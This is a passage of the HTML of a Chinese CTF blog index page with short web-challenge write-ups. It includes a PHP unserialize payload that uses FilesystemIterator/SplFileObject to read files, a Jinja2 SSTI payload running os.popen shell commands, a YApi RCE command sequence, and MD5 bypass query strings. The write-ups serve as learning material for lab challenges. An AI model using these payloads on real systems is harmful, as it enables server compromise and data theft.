$para;</span><br><span class="line">    public $check;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;class &#x3D; &quot;Hel&quot;;</span><br><span class="line">        $this-&gt;para &#x3D; &quot;xctfer&quot;;</span><br><span class="line">        echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;check &#x3D; new Filter;</span><br><span class="line">        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;</span><br><span class="line">            echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            die(&#39;what?Really?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Hel&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a &#x3D; $a;</span><br><span class="line">        echo (&quot;Hello bro, I guess you are a lazy &quot;.$this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Filter&#123;</span><br><span class="line"></span><br><span class="line">    function vaild($code)&#123;</span><br><span class="line">        $pattern &#x3D; &#39;&#x2F;[!|@|#|$|%|^|&amp;|*|&#x3D;|\&#39;|&quot;|:|;|?]&#x2F;i&#39;;</span><br><span class="line">        if (preg_match($pattern, $code))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;xctf&#39;]))&#123;</span><br><span class="line">    unserialize($_GET[&#39;xctf&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这句我一开始不太明白这句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para);</span><br></pre></td></tr></table></figure>
-<p>然后搜了一下，结果就直接搜到原题了</p>
-<p>这句的意思是：$this-&gt;class类（其实当成函数看就行）的参数是$this-&gt;para</p>
-<p>所以payload——<br>用FilesystemIterator遍历目录(把/换成文件夹，直到找到要打开的文件夹)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;FilesystemIterator&#39;;</span><br><span class="line">    public $para&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$o  &#x3D; new XMAN();</span><br><span class="line">echo serialize($o);</span><br></pre></td></tr></table></figure>
-
-<p>用SplFileObject读取文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;SplFileObject&#39;;</span><br><span class="line">    public $para &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxxXXXmMManNNn&#x2F;f1a4.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new XMAN();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/08/xman2021-easyphp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-xman2021-easyssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/08/xman2021-easyssti/">xman2021-easyssti</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/08/xman2021-easyssti/" class="archive-article-date">
-  	<time datetime="2021-08-08T11:58:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>gwctf2019的原题，现在也可以在buuctf上做——<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97</a></p>
-<p>虽然网上很多都在用curl ip端口的方法，<del>不过那个方法我怎么都没复现出来。</del>终于找到了原因：防火墙没开，想让外网发现自己，必须把防火墙的相应端口打开</p>
-<p>还好找到这个大佬的做法——<a target="_blank" rel="noopener" href="https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/">https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload——&#123;%print lipsum.__globals__[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;__im&#39;+&#39;port__&#39;](&#39;o&#39;+&#39;s&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;whoami&#39;).read()%&#125;</span><br></pre></td></tr></table></figure>
-<p>然后把whoami换成ls之类的shell指令就行</p>
-<img src="/2021/08/08/xman2021-easyssti/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/08/xman2021-easyssti/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-buu-ezrce" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/buu-ezrce/">buu-ezrce</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/04/buu-ezrce/" class="archive-article-date">
-  	<time datetime="2021-08-04T03:37:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开后发现是yapi界面，直接搜“yapi漏洞”<br>前面的步骤按照这篇来就行——<a target="_blank" rel="noopener" href="https://blog.csdn.net/Trouble_99/article/details/118667625">https://blog.csdn.net/Trouble_99/article/details/118667625</a><br>最后改代码中ls为<br>ls ..;<br>ls ../..;<br>找到ffffffflllllaggggg<br>cat ../../ffffffflllllaggggg就行</p>
-<img src="/2021/08/04/buu-ezrce/1.PNG" class="" title="1.PNG">
-<img src="/2021/08/04/buu-ezrce/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/04/buu-ezrce/3.PNG" class="" title="3.PNG">
-<img src="/2021/08/04/buu-ezrce/4.PNG" class="" title="4.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/buu-ezrce/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-buu-easythinkphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/buu-easythinkphp/">buu-easythinkphp</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/04/buu-easythinkphp/" class="archive-article-date">
-  	<time datetime="2021-08-04T02:08:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开发现thinkphp就没办法了</p>
-<img src="/2021/08/04/buu-easythinkphp/1.PNG" class="" title="1.PNG">
-<p>后来看大佬的解答，用的是thinkphp低版本的rce漏洞<br>（thinkphpgui脚本）</p>
-<img src="/2021/08/04/buu-easythinkphp/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/04/buu-easythinkphp/3.PNG" class="" title="3.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/buu-easythinkphp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-buu-easyweb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/buu-easyweb/">buu-easyweb</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/04/buu-easyweb/" class="archive-article-date">
-  	<time datetime="2021-08-04T01:12:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>学到了新姿势<br>首先是源码——</p>
-<img src="/2021/08/04/buu-easyweb/1.PNG" class="" title="1.PNG">
-
-<p>关于escapeshellarg，网上所有的漏洞都是和escapeshellcmd共同使用时产生的，当时被这个卡了很久。</p>
-<p>后来出hint说“管理员访问过这个文件”，我想到的是find可以根据时间列出文件名，但是放到cat就不适用。</p>
-<img src="/2021/08/04/buu-easyweb/4.PNG" class="" title="4.PNG">
-
-<p>还是最后看了套神的wp才明白</p>
-<p>直接找nginx的日志，发现flag文件的名字</p>
-<img src="/2021/08/04/buu-easyweb/2.PNG" class="" title="2.PNG">
-
-<p>然后找flag，打开源代码查看就行</p>
-<img src="/2021/08/04/buu-easyweb/3.PNG" class="" title="3.PNG">
-
-
-<p>还是不够细心，把“访问”当成了“打开”</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/buu-easyweb/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-视频推荐" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/">视频推荐</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/" class="archive-article-date">
-  	<time datetime="2021-08-02T13:10:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>docker（对我来说语速最舒服，普通话最好的老师之一，不背稿现场发挥的良心老师，但是有打鸡血嫌疑，前一部分适当跳过吧，但是那也比机构老师拖时间舒服多了）：<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1og4y1q7M4?from=search&amp;seid=15506386515153261111">https://www.bilibili.com/video/BV1og4y1q7M4?from=search&amp;seid=15506386515153261111</a></p>
-<p>服务器购买：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV177411K7bH">https://www.bilibili.com/video/BV177411K7bH</a><br>云翼计划：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/plan/grow-up">https://developer.aliyun.com/plan/grow-up</a><br>免费试用：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/adc/student/?spm=5176.10695662.3291411370.2.b3115a060G0pWR">https://developer.aliyun.com/adc/student/?spm=5176.10695662.3291411370.2.b3115a060G0pWR</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-工具网站" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/">工具网站</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/01/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/" class="archive-article-date">
-  	<time datetime="2021-08-01T15:17:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>CTF在线工具箱：<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/">http://ctf.ssleye.com/</a><br>包含CTF比赛中常用的编码、加解密、算法。</p>
-<p>CTF加解密工具箱：<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Category.php?Id=27">http://www.atoolbox.net/Category.php?Id=27</a></p>
-<p>ctfhub在线工具：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/tools">https://www.ctfhub.com/#/tools</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-备份是个好习惯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/">bugku-web-备份是个好习惯</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/" class="archive-article-date">
-  	<time datetime="2021-08-01T03:58:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开以后是一行类似md5的东西，随便查了一下，没查到东西<br>打开dirsearch扫目录，发现bak备份文件</p>
-<img src="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/1.PNG" class="" title="1.PNG">
-<p>打开后下载了一个记事本<br>得到源码——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017&#x2F;8&#x2F;6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>$_SERVER[‘REQUEST_URI’]：获取url行的内容<br>strstr($_SERVER[‘REQUEST_URI’], ‘?’)：截取url中?后的内容（包括?）<br>substr($str,1)：从第二个字母开始截取$str<br>$str = str_replace(‘key’,’’,$str);：把$str中的key去除，可以用kekeyy来绕过<br>parse_str() — 将字符串解析成多个变量<br>d5($key1) == md5($key2) &amp;&amp; $key1 !== $key2：MD5加密后内容（首个字符）相同，原内容不同。可以用数组绕过（1）或md5碰撞（2）。</p>
-<p>法（1）：?kekey1y[]=1&amp;kekey2y[]=2(原理：md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的)<br>法（2）：?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a（原理：md5加密后开头都是0e）</p>
-<img src="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/3.PNG" class="" title="3.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-好像需要密码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/">bugku-web-好像需要密码</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2021-08-01T03:54:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>没意思，纯爆破，浪费金币</p>
-<img src="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
-    </nav>
-  
-
-
           </div>
         </div>
